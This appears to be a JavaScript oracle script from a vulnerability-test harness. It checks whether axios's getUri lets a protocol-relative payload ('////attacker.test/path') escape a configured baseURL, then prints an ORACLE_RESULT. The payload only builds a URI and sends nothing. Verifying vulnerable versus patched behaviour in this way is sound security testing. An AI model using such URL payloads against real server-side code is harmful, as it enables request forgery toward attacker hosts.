let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  try {
    const axiosMod = require('axios');
    const axios = axiosMod && axiosMod.default ? axiosMod.default : axiosMod;

    const marker = 'oracle-ghsa-8hc4-vh64-cxmj';

    const benignClient = axios.create({
      baseURL: 'http://example.com'
    });

    const benignCfg = benignClient.getUri({ url: '/users' });
    if (typeof benignCfg !== 'string' || benignCfg !== 'http://example.com/users') {
      throw new Error('benign_uri_unexpected:' + String(benignCfg));
    }

    operation_completed = true;

    const maliciousClient = axios.create({
      baseURL: 'http://example.com'
    });

    const maliciousUri = maliciousClient.getUri({ url: '////attacker.test/path' });

    // Vulnerable behavior: protocol-relative payload is treated as absolute and escapes baseURL.
    // Patched behavior: payload is rejected as invalid in server-side mode.
    exploit_succeeded = typeof maliciousUri === 'string' && /^https?:\/\/attacker\.test\//i.test(maliciousUri);

    evidence = marker + ';benign=' + benignCfg + ';malicious=' + String(maliciousUri);
  } catch (e) {
    if (!operation_completed) {
      exploit_succeeded = false;
      evidence = 'setup_or_benign_failed:' + (e && e.message ? e.message : String(e));
    } else {
      exploit_succeeded = false;
      evidence = 'malicious_blocked_or_failed:' + (e && e.message ? e.message : String(e));
    }
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed,
    exploit_succeeded,
    evidence
  }));
})();
